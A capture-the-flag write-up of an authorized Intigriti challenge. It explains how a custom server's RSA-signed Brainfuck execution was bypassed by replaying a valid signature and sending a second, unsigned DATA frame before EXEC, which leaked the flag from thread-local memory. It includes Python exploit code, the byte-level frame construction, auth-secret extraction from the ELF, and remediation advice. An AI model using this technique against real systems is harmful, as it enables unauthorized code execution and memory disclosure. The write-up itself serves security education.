0Abstract

RSA was never the weak link

RSA-2048 did not fail in this challenge. The signature verified correctly. What failed was the binding between the authenticated bytes and the bytes ultimately executed.

The target exposed a small custom web server, a downloadable Linux ELF executable, and an HTTP bridge to a proprietary binary protocol. I recovered the protocol authentication material from the binary and used the HELP command to obtain a legitimate RSA-signed Brainfuck interpreter together with its original program and signature. The server verified SHA-256 over the original contiguous CODE + DATA region, but passed a separately mutable DATA pointer to the interpreter. By sending a second, unsigned DATA frame before EXEC, I preserved the valid signature and replaced the program that actually ran.

My first attempt printed 81 null bytes: the exploit worked, but I had miscalculated the interpreter's tape offset. Disassembly showed the flag at thread-local storage address fs:[-0x60], while the interpreter's tape began at fs:[-0x160]. Moving the Brainfuck pointer 256 bytes resolved the discrepancy and produced the live flag.

The central idea

A valid signature is only meaningful when the verifier and the consumer agree on exactly which bytes it protects. The cryptography succeeded; the authorization logic did not.

The demonstrated impact is a signature-scope bypass, execution of unsigned Brainfuck instructions under a signed native interpreter, and disclosure of protected server memory. It is not evidence that the RSA private key was recovered or that arbitrary unsigned native x86-64 code could execute.

IScope, lab, tools

Scope, lab, and tools

The testing described here was limited to the organizer's authorized November 2026 CTF host. There was no credential stuffing, third-party testing, destructive scanning, or attempt to persist on the system. The final exploit used one combined authenticated POST request.

The investigation used a macOS terminal, Python 3, curl, a disassembler (objdump), strings, and the raw HELP.bin response. On Linux, comparable commands run under binutils. The target executable is ELF64 x86-64, 47,880 bytes. Running the Linux binary is not required to assemble the exploit on macOS.

IIReconnaissance

A "Super Fast Server" with contradictory hints

The normal entry point was /login.html. The signup page declined new registrations, while the changelog and documentation exposed unusual implementation details:

  • Version 2.0.0 claimed to have fixed a path-traversal bug and introduced a custom protocol that would execute RSA-2048-signed code.
  • Version 2.0.1 announced signups, POST parsing, and revised documentation.
  • The documentation explicitly said the server served files from its process working directory, and cautioned administrators not to run the server binary in that directory.

A direct attempt to read the flag did not work:

Flag read attempts (both 404) 
curl --http1.1 --path-as-is -i \
  'https://challenge-1126.challenges.intigriti.io/the_real.flag'
# Observed: 404 Not Found

curl --http1.1 --path-as-is -i \
  'https://challenge-1126.challenges.intigriti.io/app/../the_real.flag'
# Observed: 404 Not Found

The server still leaked a great deal of filesystem information. The /app/ listing contained the actual server binary, and // showed filesystem-root entries, including the_real.flag, app/, and src/. The /src/ directory listed challenge.c, rsa.c, rsa.h, sha256.c, and bf.c; direct source-file GETs returned 404. The difference between directory enumeration and file contents mattered: the final solution was not a straightforward directory traversal.

One more recon curiosity: requesting /login.html# returns an "I'm a teapot" response (HTTP 418), a playful nod that fits the challenge's Brainfuck and coupon theme. It is an easter egg, not part of the exploit chain.

The file started with the 7f 45 4c 46 ELF magic bytes and measured 47,880 bytes. Why path enumeration failed

Around address 0x7237, the file-serving routine calls strrchr(path, '/') and passes only the substring after the final slash to fopen() (at 0x727a). This basename-only behavior explains why /app/../the_real.flag did not read the flag, even though directory listings revealed its existence.

IVProtocol

From HTTP to the private binary protocol

A static string in the binary identified the HTTP endpoint /custom_protocol. Reversing the POST handler showed it bridged the request body to a loopback protocol service on 127.0.0.1:5001. The POST route was therefore a way to interact with an otherwise internal service through the public HTTP interface.

The authentication material was 106 bytes long. Instead of guessing it, the Python probe located the hardcoded marker inside the downloaded ELF and extracted the full 106-byte sequence. The byte stream begins with authentication material and then contains framed commands.

FieldWidthEncoding
Authentication prefix106 bytesRecovered from ELF
Magic1 byteASCII w (0x77)
Payload length4 bytesUnsigned little-endian, excludes command
Command4 bytesASCII, e.g. PING
PayloadN bytesRaw bytes

The minimal authenticated PING body therefore has 106 + 1 + 4 + 4 = 115 bytes:

Inbound frame builder 
import struct

def inbound_frame(command: bytes, payload: bytes = b'') -> bytes:
    assert len(command) == 4
    return b'w' + struct.pack('<I', len(payload)) + command + payload

body = authentication_bytes_106 + inbound_frame(b'PING')
assert len(body) == 115

The first diagnostic attempt saw HTTP 503: no healthy upstream at the Envoy edge. That was an infrastructure availability problem, not a protocol-level NAK. Repeating after the backend was healthy produced a clean result:

Authenticated PING response 
GET /login.html  -> 200
POST /custom_protocol  -> 200
Body (repr): b'ACK\x00PONG'
Body (hex): 41 43 4b 00 50 4f 4e 47
GET /login.html  -> 200

That response established that authentication, framing, HTTP-to-TCP forwarding, and the PING command all worked.

VSigned sample

HELP leaked a complete, legitimate signed example

With authentication established, the next logical test was HELP. The target responded with 1,116 bytes beginning with ACK\x00. Parsing the bytes revealed a signed program consisting of four outgoing frames:

CommandPayloadMeaning
CODE396 bytesx86-64 Brainfuck interpreter
DATA424 bytesOriginal Brainfuck program
SIGN256 bytesValid RSA-2048 signature
EXEC0 bytesExecute the signed sample
A protocol subtlety

The outgoing HELP format reports a length including the four-character command. Incoming requests use a length that excludes the command. Confusing the two interpretations would shift every subsequent frame.

The first 13 bytes of HELP.bin make the framing concrete:

HELP.bin header 
41 43 4b 00 77 90 01 00 00 43 4f 44 45
|---- ACK ----| w | 0x190  |  C  O  D  E

0x190 = 400 bytes = 4-byte command + 396-byte CODE
Minimal HELP parser 
from pathlib import Path
import struct

raw = Path('HELP.bin').read_bytes()
assert raw.startswith(b'ACK\x00')
pos = 4
frames = []
while pos < len(raw):
    assert raw[pos:pos+1] == b'w'
    length = struct.unpack_from('<I', raw, pos+1)[0]  # includes 4-byte command
    packet = raw[pos+5:pos+5+length]
    frames.append((packet[:4], packet[4:]))
    pos += 5 + length

assert pos == len(raw)
for cmd, payload in frames:
    print(cmd.decode('ascii'), len(payload))
# CODE 396 / DATA 424 / SIGN 256 / EXEC 0

Decoded, the signed program only prints an encouraging greeting; it never reads the flag or touches protected memory. The exploit leaves these exact bytes in place so the signature keeps verifying, and appends a second, unsigned DATA frame (> * 256 then . >. * 80, shown in section IX) that the same signed interpreter runs instead.

VISignature

RSA verification: valid cryptography, invalid authorization

The ELF contained a 2,048-bit public RSA modulus and a public exponent of 65,537. The four exponent bytes were 00 01 00 01, which must be read as a big-endian integer. Reading them little-endian would have given an incorrect exponent.

HELP gave me a genuine signature over the original CODE + DATA. I checked it offline before attempting any bypass. The expected digest was aa73cb21fb37a5c970542a3e474e28827dbf654caa0e7df045ce21688fb4b236.

The server uses a PKCS#1 v1.5-like raw SHA-256 block rather than a conventional ASN.1 DigestInfo encoding: the RSA public operation yields 00 01 FF..FF 00 <32-byte SHA-256>. The full 256-byte block's padding and final digest matched the original signed sample. This did not require factoring the modulus, deriving a private key, or forging a fresh signature.

Offline public-key verification 
import hashlib

expected = hashlib.sha256(original_code + original_data).digest()
recovered = pow(int.from_bytes(signature, 'big'), 65537, n).to_bytes(256, 'big')
assert recovered.startswith(b'\x00\x01')
assert recovered.endswith(b'\x00' + expected)
assert set(recovered[2:-33]) == {0xff}

The decisive design flaw was not in modular exponentiation. It was in what the application believed had been authenticated.

VIIRoot cause

The signed region and execution pointer diverged

Reversing the command dispatcher revealed the relevant state transitions:

  1. CODE selects and stores the original native interpreter buffer and its length.
  2. DATA records the active Brainfuck program's pointer and length.
  3. SIGN records the supplied signature pointer and length.
  4. EXEC computes a SHA-256 digest over a contiguous region starting at the original CODE, covering CODE_length + DATA_length, and compares it to the hash recovered by RSA verification.
  5. But the interpreter is called with a different state variable: the most recently assigned DATA pointer.

Another DATA command can therefore change the active program pointer without overwriting the original signed memory. The signed bytes are unchanged, so their RSA signature keeps verifying; the executed bytes have changed.

CODE · 396 B
DATA #1 · 424 B
SIGN
WHAT THE VERIFIER AUTHENTICATES
Original contiguous CODE + DATA #1
820 bytes · SHA-256 matches · RSA valid
WHAT THE INTERPRETER EXECUTES
The most recent DATA pointer
DATA #2 · unsigned · no new signature
Security boundary - simplified pseudocode 
on_EXEC():
    expected = sha256(memory[original_code_ptr : original_code_ptr + code_len + data_len])
    if rsa_recover_digest(signature) != expected:
        reject()
    else:
        interpreter(active_data_ptr, tls_tape)  # active_data_ptr is mutable

The disassembly around 0x66a9-0x66d5 checks that the recovered digest length is 32 bytes and memcmps it against the computed digest. At 0x66f0-0x671c, it prepares the active data pointer and calls the interpreter. A valid signature can therefore authorize a different Brainfuck program from the one covered by the signed digest.

CWE-347 · Improper verification of cryptographic signature

This is a signature-scope, time-of-verification versus time-of-use problem, not a weakness in RSA-2048 key strength or SHA-256. Where CWE-347 is unavailable, the closest category is Cryptographic Issue (Generic).

VIIIExploit

Constructing the bypass, byte for byte

I kept the signed sample from HELP intact and inserted an extra unsigned DATA frame after SIGN but before EXEC.

Combined request body 
106-byte AUTH prefix
  ├─ w | 396 | CODE | original interpreter (396 bytes)
  ├─ w | 424 | DATA | original signed program (424 bytes)
  ├─ w | 256 | SIGN | original valid signature (256 bytes)
  ├─ w | 424 | DATA | attacker-controlled program (424 bytes)
  └─ w |   0 | EXEC |

Each inbound frame has nine bytes of overhead (1 + 4 + 4). The total request length works out exactly:

Length accounting 
106 AUTH + 5 × 9 frame overhead + 396 CODE + 424 DATA#1
         + 256 SIGN + 424 DATA#2 + 0 EXEC
= 106 + 45 + 1500
= 1,651 bytes

The second DATA is padded to the original 424-byte length. This preserves the length the verifier uses when calculating its signed region. The existing signed CODE and first DATA remain untouched.

Exploit construction (first variant) 
import struct

def frame(command: bytes, payload: bytes = b'') -> bytes:
    return b'w' + struct.pack('<I', len(payload)) + command + payload

# Placeholder: reads at the tape pointer's initial address.
# It demonstrated execution but returned 81 null bytes.
first_try = (b'.' + b'>.' * 80 + b'\x00').ljust(424, b'X')

request_body = (
    auth106 +
    frame(b'CODE', original_code) +
    frame(b'DATA', original_data) +
    frame(b'SIGN', original_signature) +
    frame(b'DATA', first_try) +
    frame(b'EXEC')
)
assert len(request_body) == 1651

Every frame must be sent within the same custom-protocol session. The HTTP bridge accepts multiple frames in one POST body; splitting them across separate HTTP requests would not preserve the relevant state reliably.

IXDebugging

A near miss: 81 null bytes instead of the flag

My first live exploit returned status 200, five four-byte ACK markers, and 81 \x00 bytes. That mattered because it separated two problems: the RSA verification and execution chain had succeeded, and my Brainfuck program was simply reading the wrong part of memory.

First attempt (failed output) 
HTTP 200, 101 response bytes

b'ACK\x00ACK\x00ACK\x00ACK\x00ACK\x00'
+ b'\x00' * 81

The root cause was a tape-base offset visible in the disassembly. In the flag-loading routine at 0x5d70-0x5e08, fread reads 0x51 (81) bytes from /the_real.flag and copies the start of that buffer into thread-local memory at fs:[-0x60]. The interpreter call at 0x6707 passes fs:[-0x160] as its tape pointer.

Tape offset 
Interpreter tape begins: fs:[-0x160]
Flag begins:             fs:[-0x060]
Difference:              0x160 - 0x060 = 0x100 = 256 bytes

The exploit was therefore not failing in the cryptographic layer. It just needed to advance the Brainfuck data pointer by 256 cells before printing.

Fixed Brainfuck data 
# 256 right shifts, print one byte, then repeat right+print 80 times.
# NUL ends the program; X padding restores the signed DATA length.
modified_data = (
    b'>' * 256 +
    b'.' +
    b'>.' * 80 +
    b'\x00'
).ljust(424, b'X')

assert len(b'>' * 256 + b'.' + b'>.' * 80 + b'\x00') == 418
assert len(modified_data) == 424

> increments the Brainfuck data pointer and . outputs the current byte. No RSA operation is altered here; only the second, unsigned DATA frame changes.

XIFraming

Why this isn't an RSA break or ordinary RCE

It is tempting to call this an "RSA-2048 bypass" and leave it there, but the distinction is essential:

  • RSA verification passed honestly. I replayed a valid signature on its original signed bytes.
  • The verification scope was wrong. The program that later executed was selected through another mutable pointer not bound to the signed bytes.
  • The attacker-controlled program was Brainfuck, interpreted by the already signed native interpreter. This is not proof that arbitrary new native instructions can bypass verification.
  • The demonstrated impact was sensitive memory disclosure, because the signed interpreter received a tape pointer located near the TLS flag buffer.

The observable failure is that the software answered "yes, these bytes are authenticated" and then ran different bytes. This is a cryptographic authorization logic flaw, not a weakness in SHA-256 or the RSA public exponent.

XIIRemediation

Remediation

A secure implementation must cryptographically bind the exact data executed, not merely a memory span derived from stale pointers or lengths.

  1. Verify the exact current CODE and DATA buffers. Do not hash an earlier contiguous region while executing a separate active pointer.
  2. Make verified inputs immutable. Copy verified code and data to isolated buffers and execute only those snapshots.
  3. Invalidate authorization on mutation. A new DATA or CODE command must invalidate the old verification result and require a new signature.
  4. Sign a canonical envelope. Include protocol version, command types, field lengths, code bytes, and data bytes; reject ambiguous framing.
  5. Harden protocol authentication. Avoid static secrets embedded in publicly retrievable executables; enforce authentication and isolate the private protocol.
  6. Constrain file serving. Restrict the document root and disable disclosure of arbitrary directory contents or internal binaries.
  7. Reduce memory exposure. Do not provide executable extensions with pointers adjacent to secrets; provide narrow, validated APIs instead.
Safer conceptual design 
on_EXEC():
    code = immutable_copy(active_code)
    data = immutable_copy(active_data)
    authenticated_message = canonical_encode(version, code, data)
    if not verify_signature(signature, sha256(authenticated_message)):
        return REJECT
    return execute(code, data)  # identical bytes to the authenticated message

XIVReflection

Final thoughts

This challenge began as a web-server puzzle and turned into a lesson about security checks that prove the wrong thing. A directory listing revealed the executable. An ELF binary revealed an internal protocol. That protocol provided a legitimate signed sample. The signature was sound, but the server did not tie it to the data it executed.

The most useful debugging moment was the response full of zeros. It established that the hard part, moving through authorization and execution, was already solved. From there, a 256-byte TLS offset was enough to turn a silent interpreter into a verified flag disclosure.

A valid signature is only meaningful when the verifier and the consumer agree on exactly which bytes it protects.
